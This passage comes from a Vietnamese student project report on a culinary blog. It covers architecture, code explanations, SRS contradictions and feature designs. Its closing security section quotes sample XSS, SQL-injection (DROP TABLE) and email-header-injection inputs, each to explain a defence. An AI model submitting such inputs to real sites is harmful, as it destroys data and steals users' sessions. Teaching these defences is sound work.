  - **Readiness Probe (`/health/ready`):** Kiểm tra xem **ứng dụng đã sẵn sàng nhận traffic từ người dùng hay chưa**. Endpoint này kiểm tra các dependency bên ngoài (kết nối CSDL PostgreSQL, Redis, MinIO). Nếu không sẵn sàng, hệ thống **tạm ngừng định tuyến request đến container đó** nhưng KHÔNG restart nó.
* **Nếu chỉ có một endpoint `/health` kiểm tra cả DB, điều gì xảy ra khi Database bị chậm?**
  - Khi Database bị quá tải tạm thời hoặc bị khóa bảng, endpoint `/health` sẽ trả về lỗi hoặc timeout.
  - Bộ điều phối (Docker/K8s) tưởng ứng dụng bị hỏng nên lập tức **kill container và khởi động lại liên tục (CrashLoopBackOff)**.
  - Việc hàng chục container cùng khởi động lại đồng loạt sẽ gửi hàng loạt kết nối mới tới CSDL đang yếu, tạo ra "cơn bão kết nối" (Thundering Herd Problem), khiến toàn bộ hệ sinh thái sập hoàn toàn không thể tự phục hồi.

---

### Câu 19: So sánh IMemoryCache và IDistributedCache. Nếu ứng dụng scale lên 3 instances, IMemoryCache có vấn đề gì? IDistributedCache giải quyết điều này ra sao?
* **So sánh:**
  - **IMemoryCache (In-Memory Cache):** Dữ liệu cache được lưu trữ ngay trong vùng nhớ RAM của chính tiến trình ứng dụng đó.
  - **IDistributedCache (Distributed Cache - ví dụ Redis):** Dữ liệu cache được lưu trữ tập trung tại một máy chủ cache chuyên dụng nằm ngoài các instance ứng dụng.
* **Vấn đề của IMemoryCache khi scale lên 3 instances:**
  - **Bất đồng bộ dữ liệu (Cache Inconsistency):** Giả sử Instance 1 và Instance 2 đều cache danh sách categories. Khi Admin gửi request sửa tên danh mục đến Instance 1, Instance 1 xóa cache của chính nó. Lúc này Instance 2 và 3 vẫn giữ cache cũ. Người dùng gửi request tiếp theo trúng Instance 2 sẽ thấy dữ liệu cũ, refresh lại trúng Instance 1 thấy dữ liệu mới $\rightarrow$ Giao diện giật lag, sai lệch dữ liệu.
  - **Lãng phí RAM:** Cùng một dữ liệu phải nhân ba trên 3 máy chủ khác nhau.
* **IDistributedCache (Redis) giải quyết ra sao?**
  - Toàn bộ 3 instances đều trỏ chung vào một cụm **Redis 7 Alpine**.
  - Khi Instance 1 cập nhật dữ liệu, nó gọi `redis.delete("categories:list")`. Lập tức toàn bộ cache trên Redis bị xóa. Khi Instance 2 hay 3 nhận request, chúng đều query thấy cache rỗng và cùng lấy dữ liệu mới nhất từ PostgreSQL $\rightarrow$ Dữ liệu luôn nhất quán 100%.

---

### Câu 20: Full-Text Search là gì? Tại sao PostgreSQL dùng cấu hình "simple" thay vì "english" cho Full-Text Search tiếng Việt? Kết quả khác nhau thế nào nếu dùng "english" để tokenize "phở bò"?
* **Full-Text Search (FTS) là gì?**
  - Là kỹ thuật tìm kiếm văn bản toàn diện bằng cách phân tách nội dung thành các từ khóa (tokens), chuẩn hóa chúng (loại bỏ dấu câu, chữ hoa, stop words, stemming) và tạo bảng chỉ mục đảo (Inverted Index) để tìm kiếm nhanh theo ngữ nghĩa và độ liên quan (ranking).
* **Tại sao PostgreSQL dùng cấu hình `"simple"` cho tiếng Việt?**
  - Cấu hình mặc định `"english"` trong PostgreSQL được thiết kế cho ngữ pháp tiếng Anh: áp dụng thuật toán biến đổi từ gốc (Porter Stemming: biến `cooking` $\rightarrow$ `cook`, `recipes` $\rightarrow$ `recip`) và loại bỏ các từ dừng tiếng Anh (Stop words: `a`, `an`, `the`, `and`, `me`, `in`, `to`).
  - Tiếng Việt là ngôn ngữ đơn lập, không có hậu tố biến đổi từ kiểu tiếng Anh, và chứa các từ có thể trùng với stop words tiếng Anh (ví dụ từ "me" trong "nước sốt me", "ăn" trong "món ăn").
  - Cấu hình `"simple"` chỉ đơn thuần **chuyển về chữ thường (lowercase) và tách từ theo khoảng trắng/dấu câu**, không tự ý cắt đuôi từ hay xóa từ dừng tiếng Anh. Kết hợp với hàm `unaccent()` để loại bỏ dấu tiếng Việt, nó mang lại độ chính xác cao nhất cho tiếng Việt.
* **Kết quả khác nhau khi tokenize từ "phở bò":**
  - **Dùng cấu hình `"english"`:**
    Từ "bò" trong tiếng Anh có thể bị phân tích nhầm, hoặc nếu có cụm từ chứa "me" (quả me) thì cấu hình "english" sẽ tự động **xóa bỏ luôn từ "me"** vì coi là đại từ nhân xưng tiếng Anh. Với "phở bò", nếu dùng unaccent thành "pho bo", engine tiếng Anh có thể đối chiếu stemming sai lệch.
  - **Dùng cấu hình `"simple"`:**
    `to_tsvector('simple', unaccent('phở bò'))` $\rightarrow$ sinh ra chính xác 2 lexeme: `'bo':2` và `'pho':1`. Khi người dùng gõ tìm kiếm "pho", "bo", hay "pho bo", PostgreSQL so khớp chính xác 100% bằng chỉ mục `tsvector @@ tsquery`.

---

# PHẦN II – BÁO CÁO VÀ GIẢI THÍCH MÃ NGUỒN

### 1. Báo cáo phân công công việc từng thành viên (Nhóm 25)
* **Nguyễn Hoài Nam (Trưởng nhóm - Backend & DevOps):**
  - Thiết kế kiến trúc tổng thể, Docker Compose, Nginx Reverse Proxy, cấu trúc Clean Architecture & Database schema.
  - Phụ trách toàn bộ Module Xác thực (Auth): Đăng ký, đăng nhập mật khẩu Bcrypt, Google OAuth2, cơ chế Token Rotation & chống reuse attack, xem và sửa Profile.
  - Phụ trách toàn bộ Module Công thức (Recipe Core): CRUD công thức, Optimistic Concurrency Control (RowVersion), quản lý nguyên liệu và các bước nấu tự động đánh số lại (renumbering), Soft Delete.
  - Hệ thống Health Check Probes chuẩn Cloud-Native (`/health`, `/live`, `/ready`).
* **Đỗ Duy Biên (Backend):**
  - Module Danh mục (Categories): API CRUD danh mục món ăn, kiểm tra ràng buộc toàn vẹn khi xóa.
  - Module Tìm kiếm Full-Text Search (FTS): Tích hợp `unaccent`, `pg_trgm` và `to_tsvector('simple')` trên PostgreSQL.
  - Dịch vụ Lưu trữ tệp: Tích hợp MinIO S3 SDK, kiểm tra Magic bytes/MIME type, xử lý upload ảnh.
  - Background Jobs: Tự động tạo ảnh thumbnail (Pillow), Cron job sinh `sitemap.xml` phục vụ SEO định kỳ 24h, Structured Logging kèm `Correlation-ID`.
* **Hoàng Thăng Long (Frontend Public):**
  - Xây dựng giao diện trang chủ công khai (Home Page): Banner, món mới, danh mục trực quan.
  - Trang danh mục món ăn (Category Pages) và Danh mục tổng hợp.
  - Trang duyệt danh sách công thức (Recipe Catalog) kèm bộ lọc đa tiêu chí và phân trang.
  - Trang Chi tiết công thức nấu ăn (Recipe Detail): Hiển thị nguyên liệu, các bước nấu, thông tin dinh dưỡng.
  - Giao diện Đăng nhập / Đăng ký tài khoản và Trang hồ sơ cá nhân tác giả.
* **Trần Chánh Phát (Frontend Management & Creator):**
  - Xây dựng Creator Dashboard Overview: Thống kê số lượng bài viết, lượt xem.
  - Bảng quản lý công thức cá nhân (Recipe Management Table): Lọc trạng thái Draft, Published, Archived.
  - Trình soạn thảo công thức đa bước (Recipe Editor Wizard): Bộ công cụ thêm/sửa/xóa bước nấu kéo thả (Drag and Drop), quản lý nguyên liệu.
  - Component tải ảnh lên MinIO có preview và thanh tiến trình.
  - Màn hình quản lý danh mục và người dùng cho Quản trị viên (Admin Categories & Users Management).

---

### 2. Các đoạn mã nguồn trọng tâm và giải thích chi tiết

#### a. Kiểm soát xung đột đồng thời (Optimistic Concurrency Control)
* **Vị trí:** `backend/app/api/v1/recipes.py` (hàm `update_recipe`)
* **Mã nguồn:**
```python
if recipe.row_version != payload.row_version:
    raise ConcurrencyConflictException(
        error_code="CONCURRENCY_CONFLICT",
        detail="Công thức đã bị chỉnh sửa bởi phiên khác. Vui lòng tải lại dữ liệu mới nhất trước khi lưu."
    )
recipe.row_version += 1
```
* **Ý nghĩa & Chức năng:** Giải quyết bài toán "Lost Update" khi 2 tác giả hoặc 1 tác giả mở 2 tab cùng chỉnh sửa một công thức. Hệ thống đối chiếu số `row_version` gửi lên từ client với số `row_version` hiện tại trong database. Nếu không khớp nghĩa là đã có người cập nhật trước đó, hệ thống sẽ từ chối lưu và báo lỗi `409 Conflict`, bảo vệ tính toàn vẹn dữ liệu.

#### b. Xóa mềm (Soft Delete) và Lọc toàn cục
* **Vị trí:** `backend/app/domain/models/base.py` & `backend/app/api/v1/recipes.py`
* **Mã nguồn:**
```python
# Model:
is_deleted = Column(Boolean, default=False, nullable=False, index=True)

# Query:
stmt = select(Recipe).where(Recipe.is_deleted == False)
```
* **Ý nghĩa & Chức năng:** Khi người dùng bấm xóa công thức, hệ thống không chạy lệnh `DELETE FROM recipes` mà chỉ cập nhật `is_deleted = True`. Mọi câu query lấy danh sách công thức công khai đều có điều kiện `Recipe.is_deleted == False`. Điều này giúp phục hồi dữ liệu khi cần và bảo toàn lịch sử dữ liệu quan hệ.

#### c. Tìm kiếm Full-Text Search tiếng Việt không dấu
* **Vị trí:** `backend/app/api/v1/recipes.py` (hàm `search_recipes`)
* **Mã nguồn:**
```python
or_(
    func.to_tsvector("simple", func.unaccent(Recipe.title)).bool_op("@@")(
        func.plainto_tsquery("simple", func.unaccent(q))
    ),
    func.to_tsvector("simple", func.unaccent(Recipe.description)).bool_op("@@")(
        func.plainto_tsquery("simple", func.unaccent(q))
    )
)
```
* **Ý nghĩa & Chức năng:** Tận dụng extension `unaccent` của PostgreSQL để biến cả tiêu đề/mô tả trong DB và từ khóa `q` của người dùng về dạng không dấu, sau đó đối chiếu qua `to_tsvector('simple')`. Người dùng gõ "bun cha", "bún chả" hay "BÚN CHẢ" đều tìm ra chính xác kết quả trong thời gian tính bằng mili-giây.

#### d. Quản lý tải tệp ảnh an toàn lên MinIO S3
* **Vị trí:** `backend/app/services/storage.py`
* **Ý nghĩa & Chức năng:** Kiểm tra dung lượng tệp ($\le 5\text{MB}$), kiểm tra phần mở rộng (`.jpg`, `.jpeg`, `.png`, `.webp`) và đọc các byte đầu tiên (Magic Bytes) để xác thực định dạng ảnh thật, chống mã độc đội lốt file ảnh. Sau đó tệp được đẩy vào bucket `culinary-blog` trên MinIO và sinh đường dẫn công khai.

---

### 3. Trả lời các câu hỏi thiết kế và cài đặt

#### a. Ứng dụng có bao nhiêu module/tính năng?
Ứng dụng gồm **8 Modules chính**:
1. **Module Xác thực & Người dùng (Auth & User):** Đăng ký, Đăng nhập (Local & Google OAuth2), Token Rotation, Quản lý hồ sơ tác giả, Khóa tài khoản khi sai mật khẩu 5 lần liên tiếp.
2. **Module Công thức (Recipe Catalog & Details):** Xem danh sách công thức phân trang, lọc theo danh mục, độ khó, thời gian nấu, xem chi tiết công thức gồm nguyên liệu, các bước nấu và bảng dinh dưỡng.
3. **Module Quản trị Tác giả (Creator Dashboard):** Bảng thống kê, quản lý công thức theo trạng thái (Draft, Published, Archived), trình biên soạn công thức đa bước kéo thả.
4. **Module Quản lý Danh mục (Category Management):** CRUD danh mục món ăn (chỉ dành cho Admin), tự động sinh slug tiếng Việt.
5. **Module Quản lý Người dùng (Users Management):** Dành cho Admin khóa/mở khóa tài khoản, phân quyền tác giả.
6. **Module Tìm kiếm (Full-Text Search):** Tìm kiếm không dấu tiếng Việt theo tiêu đề và mô tả.
7. **Module Lưu trữ & Xử lý Ảnh (Storage & Media):** Lưu trữ MinIO S3, resize thumbnail ảnh tự động.
8. **Module Vận hành & Giám sát (Observability & Jobs):** Bộ 3 health probes, correlation logging, cron job sinh `sitemap.xml` tự động.

#### b. Nhóm đã phát hiện những điểm mâu thuẫn nào trong file SRS?
1. **Mâu thuẫn giữa Soft Delete (`is_deleted`) và Ràng buộc duy nhất (Unique Constraint) trên `slug` / `email`:**
   - Trong SRS yêu cầu `slug` của Recipe và `email` của User phải là `UNIQUE`, đồng thời yêu cầu áp dụng Soft Delete (`is_deleted = true`).
   - Mâu thuẫn: Nếu một recipe bị xóa mềm (`is_deleted = true`), bản ghi vẫn nằm trong CSDL. Khi tác giả tạo một recipe mới có cùng tiêu đề $\rightarrow$ sinh ra cùng `slug` $\rightarrow$ CSDL sẽ báo lỗi vi phạm ràng buộc `UNIQUE` mặc dù bài cũ đã bị "xóa".
2. **Mâu thuẫn giữa Stateless JWT Authentication và Yêu cầu Thu hồi/Khóa tức thì (Revocation / Lockout):**
   - SRS định nghĩa cơ chế xác thực là JWT Stateless (không lưu session ở server). Nhưng đồng thời yêu cầu: khi người dùng Đăng xuất (`FR-AUTH-005`), hoặc bị Khóa tài khoản do brute-force (`FR-AUTH-002`), thì Access Token phải lập tức bị vô hiệu hóa. Bản chất JWT thuần stateless không thể bị thu hồi trước thời điểm hết hạn (`exp`) nếu không có một danh sách lưu vết tập trung.
3. **Mâu thuẫn trong đặc tả Công nghệ (.NET / C# vs Python / Fast-API / React):**
   - Tài liệu SRS gốc có nhiều đoạn trích dẫn các hàm của ASP.NET Core và EF Core (như `AspNetUsers`, `IMemoryCache`, `AsSplitQuery()`, `Guid`), trong khi bài toán thực tế triển khai trên kiến trúc Python FastAPI, SQLAlchemy Async và React SPA.

#### c. Hướng giải quyết các mâu thuẫn đó và lý do chọn phương án:
1. **Giải quyết Soft Delete vs Unique Constraint:**
   - Sử dụng **Unique Partial Index (Chỉ mục duy nhất có điều kiện)** trong PostgreSQL:
     `CREATE UNIQUE INDEX uq_recipes_slug_active ON recipes (slug) WHERE is_deleted = false;`
   - Hoặc khi xóa mềm, hệ thống tự động đổi slug bài cũ thành `slug_deleted_<timestamp>`. Nhờ vậy tác giả có thể tạo lại bài viết mới với slug mong muốn mà không vi phạm toàn vẹn CSDL.
2. **Giải quyết Stateless JWT vs Thu hồi:**
   - Sử dụng mô hình **Hybrid Token Pair**:
     - `Access Token` có thời hạn rất ngắn (15 phút) mang tính stateless để xử lý nhanh các request đọc/ghi thông thường.
     - `Refresh Token` được lưu trong bảng `refresh_tokens` trong PostgreSQL/Redis. Khi Đăng xuất hoặc Khóa tài khoản, hệ thống đánh dấu thu hồi (`revoked_at`) toàn bộ refresh token và ghi log vào Redis Blacklist. Sau tối đa 15 phút, access token cũ sẽ hoàn toàn mất hiệu lực và không thể refresh được nữa.
3. **Giải quyết tương thích công nghệ:**
   - Nhóm ánh xạ các khái niệm chuẩn thiết kế phần mềm sang stack tương ứng: `EF Core` $\rightarrow$ `SQLAlchemy 2.0 Async`, `IMemoryCache` $\rightarrow$ `Cachetools / In-memory dictionary`, `IDistributedCache` $\rightarrow$ `Redis 7 Alpine`, `AsSplitQuery()` $\rightarrow$ `selectinload()`.

#### d. Những điểm/tính năng mới (so với đặc tả SRS) nhóm đã xây dựng:
1. **Tự động sinh slug tiếng Việt chuẩn SEO:** Tích hợp thư viện `unidecode` để chuyển tự động tiêu đề có dấu thành URL slug thân thiện (ví dụ: *"Bánh canh cua giò heo"* $\rightarrow$ *"banh-canh-cua-gio-heo-a1b2"*), tự động thêm hậu tố ngẫu nhiên khi bị trùng lặp.
2. **Cron Job tự động sinh Sitemap XML:** Tích hợp `APScheduler` chạy nền định kỳ mỗi 24 giờ, quét toàn bộ công thức `Published` và danh mục để tạo file `static/sitemap.xml` phục vụ SEO Google.
3. **Tách biệt 3 probe Health Check chuẩn Kubernetes:** Triển khai riêng `/health/live`, `/health/ready` và `/health` tổng hợp.
4. **Middleware Correlation-ID (`X-Correlation-ID`):** Tự động sinh UUID cho mỗi HTTP request để trace luồng xử lý từ Nginx qua FastAPI tới database logs.
5. **Trang Quản lý Người dùng (Users Management UI):** Bổ sung màn hình Admin cho phép kích hoạt, khóa tài khoản và đổi vai trò người dùng trực quan.

#### e. Những tính năng chưa cài đặt / chưa làm theo phân công và lý do:
- **Auth.js trong Next.js:** Nhóm lựa chọn kiến trúc **Decoupled Architecture** tách biệt hoàn toàn Frontend (React 19 Vite SPA) và Backend (FastAPI). Việc dùng JWT Bearer qua Axios interceptor linh hoạt hơn cho SPA và tương thích với ứng dụng Mobile sau này, thay vì bị ràng buộc vào Next.js server-side cookies.
- **Dịch vụ gửi email thật (SendGrid / AWS SES):** Trong môi trường Lab học tập và đánh giá đồ án, việc cấu hình domain thật và thẻ tín dụng cho dịch vụ email trả phí có rủi ro chi phí. Nhóm đã tích hợp **MailHog** (SMTP Server ảo nội bộ chạy bằng Docker), bắt trọn 100% email chào mừng trên cổng `8025` trực quan, an toàn và dễ chấm điểm.

---

# PHẦN III – GIẢI QUYẾT CÁC BÀI TOÁN MỞ RỘNG THỰC TẾ

### 1. Bổ sung tính năng nhận thông báo qua email khi có công thức món ăn mới
* **Thiết kế CSDL:**
  - Bảng `email_subscriptions`: `id` (UUID), `user_id` (nullable), `email` (string, unique), `is_active` (boolean), `created_at` (datetime), `unsubscribe_token` (string).
* **Các bước thực hiện:**
  1. *API Đăng ký nhận tin:* Tạo endpoint `POST /api/v1/subscriptions` cho phép cả khách vãng lai và user đăng nhập đăng ký nhận bản tin qua email.
  2. *Trigger khi xuất bản:* Trong API `POST /api/v1/recipes/{id}/publish`, khi trạng thái chuyển sang `Published`:
  3. *Xử lý bất đồng bộ (Background Job):* Đẩy một tác vụ vào Message Queue (Redis / Celery / FastAPI BackgroundTasks): `send_new_recipe_email(recipe_id)`.
  4. *Nội dung Email:* Render template HTML (Jinja2) chứa tiêu đề, ảnh đại diện, tóm tắt món ăn và nút "Xem ngay", kèm link hủy đăng ký có chứa token bảo mật (`/unsubscribe?token=...`).
* **Ưu - nhược điểm:**
  - *Ưu điểm:* Tăng tỷ lệ quay lại của người dùng (User Retention), đẩy job ra nền không làm nghẽn API response của tác giả.
  - *Nhược điểm:* Cần quản lý danh sách email chống thư rác (spam) và tuân thủ luật chống thư rác (CAN-SPAM).

---

### 2. Thêm chức năng đặt banner quảng cáo có thu phí
* **Thiết kế CSDL:**
  - Bảng `advertisements`: `id`, `title`, `image_url`, `target_url`, `placement` (home_top, sidebar, recipe_detail), `start_date`, `end_date`, `status` (pending, active, expired), `impressions_count`, `clicks_count`, `advertiser_email`.
* **Các bước thực hiện:**
  1. *Backend API phân phối quảng cáo:* `GET /api/v1/ads?placement={slot}`. Lọc các banner đang `active` và trong thời hạn `start_date <= now <= end_date`. Cache danh sách này trên Redis trong 5 phút.
  2. *API Tracking:* `POST /api/v1/ads/{id}/click` và `POST /api/v1/ads/{id}/impression` ghi nhận lượt xem/click, sử dụng Redis `INCR` để tránh ghi CSDL liên tục (sau 10 phút sync về PostgreSQL một lần).
  3. *Tích hợp Cổng thanh toán (VNPAY / Momo / Stripe):* Khi đối tác đăng ký đặt banner, tạo đơn hàng thanh toán. Sau khi nhận Webhook thanh toán thành công, hệ thống tự động kích hoạt banner sang `active`.
  4. *Frontend UI:* Component `<AdBanner placement="home_top" />` tải banner động và tự động gắn thẻ `rel="sponsored nofollow"` chuẩn SEO Google.
* **Ưu - nhược điểm:**
  - *Ưu điểm:* Tạo doanh thu trực tiếp cho chủ blog, theo dõi hiệu quả quảng cáo minh bạch.
  - *Nhược điểm:* Cần kiểm duyệt hình ảnh quảng cáo tránh vi phạm thuần phong mỹ tục, tránh làm giảm tốc độ tải trang.

---

### 3. Cung cấp tính năng RSS Feed
* **Các bước thực hiện:**
  1. *Thư viện:* Sử dụng thư viện `feedgen` trong Python hoặc viết template XML trực tiếp.
  2. *Tạo Endpoint:* Định nghĩa route `GET /rss.xml` hoặc `GET /feed.xml`.
  3. *Query dữ liệu:* Lấy 20-30 công thức mới nhất có `status = Published` và `is_deleted = False`, sắp xếp theo `published_at DESC`.
  4. *Cấu trúc RSS:* Tạo các thẻ chuẩn RSS 2.0:
     - Kênh: `<title>`, `<link>`, `<description>`, `<language>vi</language>`.
     - Từng mục (`<item>`): `<title>`, `<link>`, `<description>`, `<pubDate>`, `<author>`, `<enclosure url="..." type="image/jpeg" />`.
  5. *Header trả về:* Đặt `Response(content=xml_data, media_type="application/rss+xml")`.
  6. *Caching:* Cache toàn bộ chuỗi XML trên Redis với thời gian hết hạn (TTL) 1 giờ.
* **Ưu - nhược điểm:**
  - *Ưu điểm:* Cực kỳ nhẹ, chuẩn hóa quốc tế, cho phép các trình đọc tin tức (Feedly, RSS Reader) và các bot tự động cập nhật bài viết mà không tốn tài nguyên.

---

### 4. Chia sẻ bài viết lên mạng xã hội (Facebook, Twitter/X, Pinterest)
* **Các bước thực hiện:**
  1. *Tích hợp Open Graph Meta Tags & Twitter Cards:*
     Trong thẻ `<head>` của trang chi tiết món ăn (thông qua hook `useRecipeSeo` hoặc Server-Side Rendering):
     ```html
     <meta property="og:title" content="Cách nấu Phở Bò Nam Định chuẩn vị" />
     <meta property="og:description" content="Hướng dẫn chi tiết từng bước nấu nước dùng trong vắt..." />
     <meta property="og:image" content="https://culinaryblog.com/images/pho-bo.jpg" />
     <meta property="og:url" content="https://culinaryblog.com/recipes/pho-bo" />
     <meta property="og:type" content="article" />
     <meta name="twitter:card" content="summary_large_image" />
     ```
  2. *Giao diện Nút bấm chia sẻ (Social Share Buttons):*
     Tạo các nút bấm mở popup chia sẻ nhanh:
     - Facebook: `https://www.facebook.com/sharer/sharer.php?u={encoded_url}`
     - Twitter/X: `https://twitter.com/intent/tweet?url={encoded_url}&text={title}`
     - Pinterest: `https://pinterest.com/pin/create/button/?url={encoded_url}&media={image_url}&description={title}`
  3. *Web Share API (cho thiết bị di động):*
     Nếu trình duyệt hỗ trợ `navigator.share`, bấm nút Share sẽ mở menu chia sẻ gốc của điện thoại (Zalo, Tin nhắn, AirDrop).

---

### 5. Đánh giá (1-5 sao) công thức món ăn
* **Thiết kế CSDL:**
  - Bảng `recipe_ratings`:
    - `id` (UUID), `recipe_id` (UUID, Foreign Key), `user_id` (String, Foreign Key), `score` (SmallInteger, từ 1 đến 5), `created_at`, `updated_at`.
    - Ràng buộc: `UNIQUE (recipe_id, user_id)` (mỗi người dùng chỉ được đánh giá 1 lần cho 1 công thức, có thể sửa lại điểm).
  - Tối ưu hóa bảng `recipes`: Bổ sung 2 cột tính sẵn (Denormalization) để query cực nhanh:
    `rating_average` (Numeric(3,2), default 0.0) và `rating_count` (Integer, default 0).
* **Các bước thực hiện:**
  1. *Endpoint Đánh giá:* `POST /api/v1/recipes/{id}/ratings` (Yêu cầu đăng nhập).
  2. *Kiểm tra nghiệp vụ (Resource Authorization):* Không cho phép tác giả tự đánh giá món ăn do chính mình tạo ra (`recipe.author_id != current_user.id`).
  3. *Tính toán lại điểm:* Dùng transaction hoặc trigger cập nhật lại `rating_average` và `rating_count` trên bảng `recipes`.
  4. *Schema.org Structured Data:* Cập nhật thẻ JSON-LD chứa `aggregateRating` (`ratingValue`, `reviewCount`) để Google hiển thị các ngôi sao vàng ngay trên kết quả tìm kiếm Google Search.

---

### 6. Module bình luận (Comments) một công thức món ăn
* **Thiết kế CSDL:**
  - Bảng `recipe_comments`:
    - `id` (UUID), `recipe_id` (UUID), `user_id` (String), `parent_id` (UUID, nullable - dùng cho chức năng trả lời bình luận lồng nhau / nested replies), `content` (Text), `is_hidden` (Boolean, default False - dùng cho kiểm duyệt), `created_at`, `updated_at`.
* **Các bước thực hiện:**
  1. *API CRUD bình luận:*
     - `GET /api/v1/recipes/{id}/comments`: Lấy danh sách bình luận (phân trang).
     - `POST /api/v1/recipes/{id}/comments`: Thêm bình luận mới (bắt buộc đăng nhập).
     - `DELETE /api/v1/comments/{id}`: Chỉ chính chủ bình luận hoặc Admin mới có quyền xóa.
  2. *Chống Spam & Mã độc:*
     - Áp dụng Rate Limiting: Mỗi user chỉ được gửi tối đa 1 comment trong 10 giây.
     - Lọc nội dung: Sanitize HTML tránh mã độc XSS, kiểm duyệt từ khóa nhạy cảm.
  3. *UI Component:* Khung hiển thị danh sách comment kèm avatar người dùng, ngày đăng, form nhập liệu có nút Gửi và đếm số ký tự còn lại.

---

### 7. Trang Liên hệ (Contact Us) gửi thông tin tới chủ kênh
* **Thiết kế CSDL:**
  - Bảng `contact_inquiries`:
    - `id` (UUID), `full_name` (String(100)), `email` (String(256)), `subject` (String(200)), `message` (Text), `status` (SmallInteger: 0=Chưa đọc, 1=Đã đọc, 2=Đã phản hồi), `ip_address` (String), `created_at`.
* **Các bước thực hiện:**
  1. *Backend API công khai:* `POST /api/v1/contact`.
  2. *Bảo mật Form:* Kiểm tra định dạng email hợp lệ, kiểm tra độ dài tin nhắn (từ 10 đến 2000 ký tự), tích hợp mã Captcha (Cloudflare Turnstile) và Rate Limit theo IP (tối đa 3 lần gửi/giờ).
  3. *Gửi thông báo qua Email:* Kích hoạt Background task gửi email thông báo cho quản trị viên blog qua MailHog/SMTP: *"Bạn có tin nhắn liên hệ mới từ độc giả X"*.
  4. *Trang Quản trị Admin:* Màn hình xem danh sách các thư liên hệ, lọc theo trạng thái và cho phép Admin nhập nội dung trả lời gửi ngược lại email người liên hệ.

---

### 8. Bổ sung tính năng Câu hỏi thường gặp (FAQ)
* **Thiết kế CSDL:**
  - Bảng `faqs`: `id` (UUID), `question` (String), `answer` (Text), `category` (String - ví dụ: "Tài khoản", "Công thức", "Bản quyền"), `order_index` (Integer), `is_published` (Boolean).
* **Các bước thực hiện:**
  1. *API công khai:* `GET /api/v1/faqs` lấy danh sách câu hỏi đã xuất bản, sắp xếp theo `order_index`. Cache kết quả trên Redis.
  2. *API Admin quản lý:* Bộ endpoint CRUD câu hỏi dành riêng cho Admin.
  3. *Giao diện Accordion:* Component danh sách câu hỏi có thể bấm vào để bung ra / gập lại (Accordion UI) mượt mà.
  4. *Tối ưu SEO (FAQPage Schema):* Nhúng đoạn mã JSON-LD chuẩn `schema.org/FAQPage` vào trang. Nhờ đó Google hiển thị trực tiếp danh sách câu hỏi và câu trả lời dạng rich snippet trên trang kết quả tìm kiếm.

---

### 9. Rủi ro bảo mật đối với các form nhập liệu (Liên hệ, Bình luận) và Giải pháp hạn chế
* **Các rủi ro bảo mật chính:**
  1. **Stored XSS (Cross-Site Scripting lưu trữ):** Kẻ tấn công nhập các thẻ `<script>alert(document.cookie)</script>` hoặc `<img> onerror=...` vào ô bình luận/liên hệ. Khi Admin hoặc độc giả khác vào đọc, trình duyệt sẽ tự động thực thi mã script đánh cắp phiên làm việc.
  2. **SQL Injection:** Kẻ tấn công chèn các câu lệnh SQL độc hại (`' OR 1=1; DROP TABLE recipes; --`) vào trường nhập liệu hòng phá hoại hoặc trích xuất toàn bộ CSDL.
  3. **Spam Bot & Distributed DoS (DDoS):** Bot tự động liên tục gửi hàng triệu request liên hệ/bình luận mỗi phút, làm cạn kiệt dung lượng ổ cứng CSDL, nghẽn đường truyền mạng và làm đầy hộp thư email.
  4. **Email Header Injection (trong form Liên hệ):** Kẻ tấn công chèn ký tự xuống dòng (`\r\nBcc: victim@gmail.com`) vào trường họ tên hoặc tiêu đề, biến máy chủ gửi mail của blog thành công cụ phát tán thư rác ẩn danh.
* **Giải pháp hạn chế triệt để:**
  - **Chống XSS:** Luôn làm sạch dữ liệu đầu vào (Input Sanitization) và mã hóa ký tự đặc biệt (HTML Encoding) trước khi hiển thị ra màn hình (`&` $\rightarrow$ `&amp;`, `<` $\rightarrow$ `&lt;`). Thiết lập chính sách **Content Security Policy (CSP)** ở Nginx.
  - **Chống SQL Injection:** Tuyệt đối không cộng chuỗi SQL. 100% truy vấn phải sử dụng **Parameterized Queries** thông qua ORM (SQLAlchemy / Pydantic validation).
  - **Chống Spam Bot:** Tích hợp CAPTCHA thân thiện và bảo mật cao như **Cloudflare Turnstile**; áp dụng **Rate Limiting** dựa trên IP và Token lưu trong Redis (ví dụ tối đa 5 bình luận/phút/IP).
  - **Chống Email Injection:** Sử dụng các thư viện gửi mail chuyên dụng, lọc bỏ toàn bộ ký tự xuống dòng `\r`, `\n` trong các trường tiêu đề và tên người gửi.
